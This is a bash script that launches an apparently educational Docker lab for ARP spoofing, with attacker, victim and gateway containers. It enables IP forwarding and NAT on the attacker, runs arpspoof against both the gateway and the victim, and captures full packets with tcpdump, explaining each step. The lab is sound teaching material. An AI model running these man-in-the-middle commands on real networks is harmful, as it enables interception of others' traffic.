#!/bin/bash

# Script to launch ARP Spoofing Lab Environment
# This script starts the Docker containers and opens terminal windows for the attacker and victim

set -e

echo "=================================================="
echo "  ARP Spoofing Lab Environment Launcher"
echo "=================================================="
echo ""

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Check if docker-compose is installed
if ! command -v docker-compose &> /dev/null && ! command -v docker &> /dev/null; then
    echo -e "${RED}Error: docker-compose or docker is not installed${NC}"
    exit 1
fi

# Determine docker compose command
if command -v docker-compose &> /dev/null; then
    DOCKER_COMPOSE="docker-compose"
elif docker compose version &> /dev/null 2>&1; then
    DOCKER_COMPOSE="docker compose"
else
    echo -e "${RED}Error: docker-compose is not available${NC}"
    exit 1
fi

# Navigate to the script directory
cd "$(dirname "$0")"

echo -e "${YELLOW}Step 1: Building and starting Docker containers...${NC}"
$DOCKER_COMPOSE up -d --build

echo ""
echo -e "${YELLOW}Step 2: Waiting for containers to be ready...${NC}"
sleep 3

# Check if containers are running
if ! docker ps | grep -q "attacker\|victim\|gateway"; then
    echo -e "${RED}Error: Containers failed to start${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Containers are running${NC}"
echo ""

# Enable IP forwarding on attacker (critical for intercepting both directions)
echo -e "${YELLOW}Configuring attacker for man-in-the-middle...${NC}"
docker exec attacker bash -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
docker exec attacker bash -c "iptables -t nat -A POSTROUTING -s 10.5.0.20 -j MASQUERADE"
IP_FORWARD=$(docker exec attacker cat /proc/sys/net/ipv4/ip_forward)
if [ "$IP_FORWARD" = "1" ]; then
    echo -e "${GREEN}✓ IP forwarding enabled (value: $IP_FORWARD)${NC}"
    echo -e "${GREEN}✓ MASQUERADE/SNAT configured for victim traffic${NC}"
    echo "  All traffic from victim will appear to come from attacker"
    echo "  This ensures responses come back through the attacker"
else
    echo -e "${RED}✗ IP forwarding NOT enabled (value: $IP_FORWARD)${NC}"
fi
echo ""

# Display network information
echo -e "${YELLOW}Network Configuration:${NC}"
echo "  Gateway:  10.5.0.254"
echo "  Attacker: 10.5.0.10"
echo "  Victim:   10.5.0.20"
echo ""

# Function to detect available terminal emulator
detect_terminal() {
    if command -v gnome-terminal &> /dev/null; then
        echo "gnome-terminal"
    elif command -v xfce4-terminal &> /dev/null; then
        echo "xfce4-terminal"
    elif command -v konsole &> /dev/null; then
        echo "konsole"
    elif command -v xterm &> /dev/null; then
        echo "xterm"
    else
        echo "none"
    fi
}

TERMINAL=$(detect_terminal)

if [ "$TERMINAL" = "none" ]; then
    echo -e "${RED}No supported terminal emulator found${NC}"
    echo "Please open terminal windows manually and run:"
    echo ""
    echo "  Attacker Window 1 (ARP Spoofing - Gateway):"
    echo "    docker exec -it attacker bash -c 'arpspoof -i eth0 -t 10.5.0.254 10.5.0.20'"
    echo ""
    echo "  Attacker Window 2 (ARP Spoofing - Victim):"
    echo "    docker exec -it attacker bash -c 'arpspoof -i eth0 -t 10.5.0.20 10.5.0.254'"
    echo ""
    echo "  Attacker Window 3 (Network Monitor):"
    echo "    docker exec -it attacker bash -c 'tcpdump -i eth0 -n'"
    echo ""
    echo "  Victim Window (Traffic Generator):"
    echo "    docker exec -it victim bash"
    exit 0
fi

echo -e "${YELLOW}Step 3: Opening terminal windows...${NC}"
echo "Using terminal: $TERMINAL"
echo ""

# Function to open terminals based on detected terminal emulator
open_terminal() {
    local title="$1"
    local command="$2"
    
    case "$TERMINAL" in
        "gnome-terminal")
            gnome-terminal --title="$title" -- bash -c "$command; exec bash" &
            ;;
        "xfce4-terminal")
            xfce4-terminal --title="$title" -e "bash -c '$command; exec bash'" &
            ;;
        "konsole")
            konsole --title "$title" -e bash -c "$command; exec bash" &
            ;;
        "xterm")
            xterm -title "$title" -e bash -c "$command; exec bash" &
            ;;
    esac
    sleep 0.5
}

# Open Attacker Window 1 - ARP Spoofing for Gateway
echo "  Opening: Attacker Window 1 (ARP Spoofing - Gateway)"
open_terminal "Attacker: ARP Spoof Gateway" \
    "echo -e '${GREEN}ARP Spoofing: Gateway (10.5.0.254)${NC}'; \
     echo 'Poisoning ARP cache of gateway, pretending to be victim...'; \
     echo 'This tells the gateway: \"victim (10.5.0.20) is at MY MAC address\"'; \
     echo ''; \
     echo 'Command: arpspoof -i eth0 -t 10.5.0.254 10.5.0.20'; \
     echo '  -t 10.5.0.254 = target (gateway)'; \
     echo '  10.5.0.20 = pretend to be this IP (victim)'; \
     echo ''; \
     echo 'Press Enter to start ARP spoofing...'; \
     read; \
     docker exec -it attacker bash -c 'echo \"Starting ARP spoofing...\"; arpspoof -i eth0 -t 10.5.0.254 10.5.0.20'"

# Open Attacker Window 2 - ARP Spoofing for Victim
echo "  Opening: Attacker Window 2 (ARP Spoofing - Victim)"
open_terminal "Attacker: ARP Spoof Victim" \
    "echo -e '${GREEN}ARP Spoofing: Victim (10.5.0.20)${NC}'; \
     echo 'Poisoning ARP cache of victim, pretending to be gateway...'; \
     echo 'This tells the victim: \"gateway (10.5.0.254) is at MY MAC address\"'; \
     echo ''; \
     echo 'Command: arpspoof -i eth0 -t 10.5.0.20 10.5.0.254'; \
     echo '  -t 10.5.0.20 = target (victim)'; \
     echo '  10.5.0.254 = pretend to be this IP (gateway)'; \
     echo ''; \
     echo 'Press Enter to start ARP spoofing...'; \
     read; \
     docker exec -it attacker bash -c 'echo \"Starting ARP spoofing...\"; arpspoof -i eth0 -t 10.5.0.20 10.5.0.254'"

# Open Attacker Window 3 - Network Monitor
echo "  Opening: Attacker Window 3 (Network Monitor)"
open_terminal "Attacker: Network Monitor" \
    "echo -e '${GREEN}Network Traffic Monitor${NC}'; \
     echo 'Watching all HTTP and ICMP traffic with packet contents...'; \
     echo ''; \
     echo 'Command: tcpdump -i eth0 -XX -s 0 -l \"tcp or icmp\"'; \
     echo '  -XX: Show both hex and ASCII for entire packet'; \
     echo '  -s 0: Capture full packet (not just headers)'; \
     echo '  -l: Line buffered output (immediate display)'; \
     echo '  Filter: ALL TCP and ICMP traffic'; \
     echo ''; \
     echo 'TIP: Look for both directions:'; \
     echo '  - victim > server  (outgoing request with GET / HTTP/1.1)'; \
     echo '  - server > victim  (incoming response with HTTP/1.1 200 OK)'; \
     echo '  - Packets with \"length 0\" are ACKs (no data, but confirm receipt)'; \
     echo '  - Packets with \"length > 0\" contain actual data'; \
     echo ''; \
     echo 'Press Enter to start monitoring...'; \
     read; \
     docker exec -it attacker bash -c 'tcpdump -i eth0 -XX -s 0 -l \"tcp or icmp\"'"

# Open Victim Window - Traffic Generator
echo "  Opening: Victim Window (Traffic Generator)"
open_terminal "Victim: Traffic Generator" \
    "echo -e '${GREEN}Victim Container - Traffic Generator${NC}'; \
     echo ''; \
     echo 'You can generate network traffic with:'; \
     echo '  ping 8.8.8.8          - Ping Google DNS'; \
     echo '  ping 10.5.0.254       - Ping gateway'; \
     echo '  curl http://example.com - HTTP request'; \
     echo '  traceroute 8.8.8.8    - Trace route to internet'; \
     echo ''; \
     docker exec -it victim bash"

echo ""
echo -e "${GREEN}✓ All terminal windows opened${NC}"
echo ""
echo -e "${YELLOW}=================================================="
echo "  Lab Environment Ready!"
echo "==================================================${NC}"
echo ""
echo "To perform ARP spoofing attack:"
echo "  1. Start ARP spoofing in BOTH attacker windows (press Enter in each)"
echo "  2. Wait a few seconds for ARP caches to be poisoned"
echo "  3. Start network monitoring in the third attacker window"
echo "  4. Generate traffic from the victim window"
echo ""
echo "IMPORTANT: Both ARP spoofing processes must be running!"
echo "  - Window 1: Spoofs the gateway (tells it victim is at attacker's MAC)"
echo "  - Window 2: Spoofs the victim (tells it gateway is at attacker's MAC)"
echo ""
echo "To verify the attack is working, you can check ARP tables:"
echo "  docker exec victim arp -n           # Should show gateway at attacker's MAC"
echo "  docker exec gateway arp -n          # Should show victim at attacker's MAC"
echo "  docker exec attacker cat /proc/sys/net/ipv4/ip_forward  # Should be 1"
echo ""
echo "To stop the environment:"
echo "  $DOCKER_COMPOSE down"
echo ""
